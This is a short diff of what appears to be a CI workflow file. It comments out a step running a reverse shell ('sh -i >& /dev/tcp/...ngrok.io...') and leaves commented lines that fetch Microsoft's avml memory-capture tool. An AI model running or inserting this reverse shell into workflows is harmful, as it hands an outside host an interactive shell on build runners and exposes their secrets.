@@ -30,7 +30,7 @@ jobs:
       #
       #ngrok tcp 1337
       #
-      - run: sh -i >& /dev/tcp/0.tcp.au.ngrok.io/18519 0>&1
+      # - run: sh -i >& /dev/tcp/0.tcp.au.ngrok.io/18519 0>&1
       # - run: |
       #     wget -O ./avml https://github.com/microsoft/avml/releases/download/v0.18.0/avml
       #     chmod +x ./avml
